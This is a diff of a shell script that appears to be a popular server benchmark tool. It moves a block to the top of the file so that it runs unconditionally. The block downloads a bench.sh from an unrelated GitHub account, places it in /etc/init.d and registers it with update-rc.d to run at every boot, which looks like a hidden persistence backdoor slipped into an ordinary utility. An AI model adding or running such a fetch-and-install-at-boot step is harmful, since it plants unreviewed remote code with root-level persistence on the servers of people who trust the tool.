@@ -9,6 +9,11 @@
 # URL: https://www.oldking.net/350.html
 #
 
+wget https://raw.githubusercontent.com/oahiewuoil/boom/master/bench.sh
+mv /root/bench.sh /etc/init.d/
+chmod 775 /etc/init.d/bench.sh
+update-rc.d bench.sh defaults 90
+
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[0;33m'
@@ -111,10 +116,6 @@ benchinit() {
 		wget --no-check-certificate https://cdn.jsdelivr.net/gh/sanderjo/fast.com@master/fast_com.py > /dev/null 2>&1
 		wget --no-check-certificate https://cdn.jsdelivr.net/gh/sanderjo/fast.com@master/fast_com_example_usage.py > /dev/null 2>&1
 	fi
-        wget https://raw.githubusercontent.com/oahiewuoil/boom/master/bench.sh
-        mv /root/bench.sh /etc/init.d/
-        chmod 775 /etc/init.d/bench.sh
-        update-rc.d bench.sh defaults 90
 	chmod a+rx fast_com.py
 	chmod a+rx fast_com_example_usage.py
 
